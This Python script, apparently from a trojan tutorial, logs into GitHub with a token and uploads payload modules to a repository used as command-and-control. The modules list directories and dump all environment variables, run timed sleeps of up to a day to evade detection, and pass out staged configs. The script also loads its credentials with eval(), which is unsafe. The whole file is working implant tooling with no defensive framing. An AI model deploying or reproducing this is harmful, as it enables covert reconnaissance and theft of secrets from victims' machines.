#!/usr/bin/env python3

from github3 import login
from datetime import datetime

def github_connect() -> object:
    with open('git_stuff.txt', 'r') as f:
        git_info = eval(f.read())
    gh = login(username=git_info['user'], token=git_info['token']) 
    repo = gh.repository(git_info['user'], git_info['repo_name'])
    return repo

stage_1 = r'''
import json

def run(**args):
  print('[$] Enter stage 1')
  basic_config =json.dumps([{"module" : "dir_lister"},{"module" : "enviro"},{"module" : "sleep"},{"module" : "stage_2_qrw"}])
  return basic_config
'''

dir_lister = r'''
import os

def run(**args):
    print('[*] In dir_lister module.')
    files = os.listdir('.')
    return str(files)
'''

enviro = r'''
import os

def run(**args):
    print('[*] In enviroment module.')
    return os.environ
'''

sleep = r'''
import time
import random

def run(**args):
   upper = 15
   lower = 10
   sleep_time = random.randint(lower, upper)
   print('[!] Sleep:', sleep_time)
   time.sleep(sleep_time)
   return sleep_time
'''

stage_2_qrw = r'''
import json

def run(**args):
  print('[$] Enter Stage 2')
  basic_config =json.dumps([{"module" : "sleep24h"}])
  return basic_config
'''

sleep24h = r'''
import time
import random

def run(**args):
  print('[!] Sleep for a day')
  time.sleep(random.randint(86000,86800))
'''

modules_list = [['stage_1',stage_1], ['dir_lister',dir_lister], ['enviro',enviro], ['sleep',sleep], ['stage_2_qrw',stage_2_qrw], ['sleep24h',sleep24h]]

repo = github_connect()

for module in modules_list:
    path = f'modules/{module[0]}.py'
    message = f'{module[0]}_init_{datetime.now().isoformat()}'
    bindata = bindata = bytes(r'%s' %module[1], 'utf-8')
    repo.create_file(path, message, bindata)